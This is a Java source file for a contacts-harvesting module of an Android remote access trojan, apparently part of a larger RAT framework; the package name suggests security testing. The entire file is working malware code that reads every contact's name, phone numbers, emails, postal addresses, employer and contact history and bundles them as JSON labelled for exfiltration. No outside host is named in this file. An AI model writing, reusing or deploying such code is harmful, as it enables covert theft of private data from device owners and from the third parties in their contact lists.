package com.security.test.rat.modules.exfiltration;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * ContactsModule - Implements contact list extraction
 * 
 * Features:
 * - Extract all contacts
 * - Extract contact details (phone, email, address)
 * - Filter contacts by criteria
 * - Export in various formats
 */
public class ContactsModule extends RATModule {
    
    private static final String TAG = "ContactsModule";
    
    private Context context;
    private boolean isInitialized = false;
    
    public ContactsModule(Context context) {
        super("ContactsModule", "Contact list extraction and exfiltration");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing ContactsModule");
            
            // Check if we have contacts permission
            if (context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Contacts permission not granted");
                return false;
            }
            
            isInitialized = true;
            Log.i(TAG, "ContactsModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize ContactsModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            isInitialized = false;
            Log.i(TAG, "ContactsModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during ContactsModule cleanup", e);
        }
    }
    
    /**
     * Extract all contacts
     */
    public String extractAllContacts() throws Exception {
        if (!isInitialized) {
            throw new Exception("ContactsModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting all contacts");
            
            List<Contact> contacts = getAllContacts();
            JSONArray contactsArray = new JSONArray();
            
            for (Contact contact : contacts) {
                contactsArray.put(contact.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("total_contacts", contacts.size());
            result.put("contacts", contactsArray);
            
            Log.i(TAG, "Extracted " + contacts.size() + " contacts");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract contacts", e);
            throw e;
        }
    }
    
    /**
     * Extract contacts with specific details
     */
    public String extractContactsWithDetails(String[] detailTypes) throws Exception {
        if (!isInitialized) {
            throw new Exception("ContactsModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting contacts with details: " + String.join(", ", detailTypes));
            
            List<Contact> contacts = getAllContactsWithDetails(detailTypes);
            JSONArray contactsArray = new JSONArray();
            
            for (Contact contact : contacts) {
                contactsArray.put(contact.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("total_contacts", contacts.size());
            result.put("detail_types", detailTypes);
            result.put("contacts", contactsArray);
            
            Log.i(TAG, "Extracted " + contacts.size() + " contacts with details");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract contacts with details", e);
            throw e;
        }
    }
    
    /**
     * Search contacts by name
     */
    public String searchContactsByName(String searchTerm) throws Exception {
        if (!isInitialized) {
            throw new Exception("ContactsModule not initialized");
        }
        
        try {
            Log.i(TAG, "Searching contacts by name: " + searchTerm);
            
            List<Contact> contacts = searchContacts(searchTerm);
            JSONArray contactsArray = new JSONArray();
            
            for (Contact contact : contacts) {
                contactsArray.put(contact.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("search_term", searchTerm);
            result.put("total_results", contacts.size());
            result.put("contacts", contactsArray);
            
            Log.i(TAG, "Found " + contacts.size() + " contacts matching: " + searchTerm);
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to search contacts", e);
            throw e;
        }
    }
    
    /**
     * Get all contacts
     */
    private List<Contact> getAllContacts() {
        List<Contact> contacts = new ArrayList<>();
        
        try {
            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            String[] projection = {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER,
                ContactsContract.Contacts.TIMES_CONTACTED,
                ContactsContract.Contacts.LAST_TIME_CONTACTED
            };
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, null, null, 
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    int hasPhone = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    int timesContacted = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
                    long lastContacted = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                    
                    Contact contact = new Contact(id, name);
                    contact.setHasPhone(hasPhone > 0);
                    contact.setTimesContacted(timesContacted);
                    contact.setLastContacted(lastContacted);
                    
                    contacts.add(contact);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting all contacts", e);
        }
        
        return contacts;
    }
    
    /**
     * Get all contacts with detailed information
     */
    private List<Contact> getAllContactsWithDetails(String[] detailTypes) {
        List<Contact> contacts = getAllContacts();
        
        for (Contact contact : contacts) {
            try {
                if (contains(detailTypes, "phone")) {
                    contact.setPhoneNumbers(getPhoneNumbers(contact.getId()));
                }
                
                if (contains(detailTypes, "email")) {
                    contact.setEmails(getEmails(contact.getId()));
                }
                
                if (contains(detailTypes, "address")) {
                    contact.setAddresses(getAddresses(contact.getId()));
                }
                
                if (contains(detailTypes, "organization")) {
                    contact.setOrganization(getOrganization(contact.getId()));
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error getting details for contact: " + contact.getName(), e);
            }
        }
        
        return contacts;
    }
    
    /**
     * Search contacts by name
     */
    private List<Contact> searchContacts(String searchTerm) {
        List<Contact> contacts = new ArrayList<>();
        
        try {
            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            String[] projection = {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
            };
            
            String selection = ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?";
            String[] selectionArgs = { "%" + searchTerm + "%" };
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, 
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    int hasPhone = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    
                    Contact contact = new Contact(id, name);
                    contact.setHasPhone(hasPhone > 0);
                    
                    contacts.add(contact);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error searching contacts", e);
        }
        
        return contacts;
    }
    
    /**
     * Get phone numbers for a contact
     */
    private List<String> getPhoneNumbers(String contactId) {
        List<String> phoneNumbers = new ArrayList<>();
        
        try {
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] projection = { ContactsContract.CommonDataKinds.Phone.NUMBER };
            String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?";
            String[] selectionArgs = { contactId };
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    phoneNumbers.add(phoneNumber);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone numbers for contact: " + contactId, e);
        }
        
        return phoneNumbers;
    }
    
    /**
     * Get emails for a contact
     */
    private List<String> getEmails(String contactId) {
        List<String> emails = new ArrayList<>();
        
        try {
            Uri uri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
            String[] projection = { ContactsContract.CommonDataKinds.Email.ADDRESS };
            String selection = ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?";
            String[] selectionArgs = { contactId };
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String email = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                    emails.add(email);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting emails for contact: " + contactId, e);
        }
        
        return emails;
    }
    
    /**
     * Get addresses for a contact
     */
    private List<String> getAddresses(String contactId) {
        List<String> addresses = new ArrayList<>();
        
        try {
            Uri uri = ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI;
            String[] projection = { 
                ContactsContract.CommonDataKinds.StructuredPostal.STREET,
                ContactsContract.CommonDataKinds.StructuredPostal.CITY,
                ContactsContract.CommonDataKinds.StructuredPostal.REGION,
                ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE,
                ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY
            };
            String selection = ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = ?";
            String[] selectionArgs = { contactId };
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String street = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                    String city = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                    String region = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                    String postcode = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                    String country = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                    
                    StringBuilder address = new StringBuilder();
                    if (street != null) address.append(street).append(", ");
                    if (city != null) address.append(city).append(", ");
                    if (region != null) address.append(region).append(", ");
                    if (postcode != null) address.append(postcode).append(", ");
                    if (country != null) address.append(country);
                    
                    if (address.length() > 0) {
                        addresses.add(address.toString());
                    }
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting addresses for contact: " + contactId, e);
        }
        
        return addresses;
    }
    
    /**
     * Get organization information for a contact
     */
    private String getOrganization(String contactId) {
        try {
            Uri uri = ContactsContract.CommonDataKinds.Organization.CONTENT_URI;
            String[] projection = { 
                ContactsContract.CommonDataKinds.Organization.COMPANY,
                ContactsContract.CommonDataKinds.Organization.TITLE
            };
            String selection = ContactsContract.CommonDataKinds.Organization.CONTACT_ID + " = ?";
            String[] selectionArgs = { contactId };
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                String company = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY));
                String title = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                
                cursor.close();
                
                if (company != null && title != null) {
                    return title + " at " + company;
                } else if (company != null) {
                    return company;
                } else if (title != null) {
                    return title;
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting organization for contact: " + contactId, e);
        }
        
        return null;
    }
    
    /**
     * Check if array contains a value
     */
    private boolean contains(String[] array, String value) {
        if (array == null) return false;
        for (String item : array) {
            if (value.equals(item)) return true;
        }
        return false;
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        try {
            int totalContacts = getAllContacts().size();
            return "Ready - " + totalContacts + " contacts available";
            
        } catch (Exception e) {
            return "Error getting contact count";
        }
    }
    
    /**
     * Contact data class
     */
    private static class Contact {
        private String id;
        private String name;
        private boolean hasPhone;
        private int timesContacted;
        private long lastContacted;
        private List<String> phoneNumbers;
        private List<String> emails;
        private List<String> addresses;
        private String organization;
        
        public Contact(String id, String name) {
            this.id = id;
            this.name = name;
            this.phoneNumbers = new ArrayList<>();
            this.emails = new ArrayList<>();
            this.addresses = new ArrayList<>();
        }
        
        // Getters and setters
        public String getId() { return id; }
        public String getName() { return name; }
        public boolean hasPhone() { return hasPhone; }
        public void setHasPhone(boolean hasPhone) { this.hasPhone = hasPhone; }
        public int getTimesContacted() { return timesContacted; }
        public void setTimesContacted(int timesContacted) { this.timesContacted = timesContacted; }
        public long getLastContacted() { return lastContacted; }
        public void setLastContacted(long lastContacted) { this.lastContacted = lastContacted; }
        public List<String> getPhoneNumbers() { return phoneNumbers; }
        public void setPhoneNumbers(List<String> phoneNumbers) { this.phoneNumbers = phoneNumbers; }
        public List<String> getEmails() { return emails; }
        public void setEmails(List<String> emails) { this.emails = emails; }
        public List<String> getAddresses() { return addresses; }
        public void setAddresses(List<String> addresses) { this.addresses = addresses; }
        public String getOrganization() { return organization; }
        public void setOrganization(String organization) { this.organization = organization; }
        
        /**
         * Convert contact to JSON
         */
        public JSONObject toJSON() throws JSONException {
            JSONObject json = new JSONObject();
            json.put("id", id);
            json.put("name", name);
            json.put("has_phone", hasPhone);
            json.put("times_contacted", timesContacted);
            json.put("last_contacted", lastContacted);
            json.put("phone_numbers", new JSONArray(phoneNumbers));
            json.put("emails", new JSONArray(emails));
            json.put("addresses", new JSONArray(addresses));
            json.put("organization", organization);
            return json;
        }
    }
}
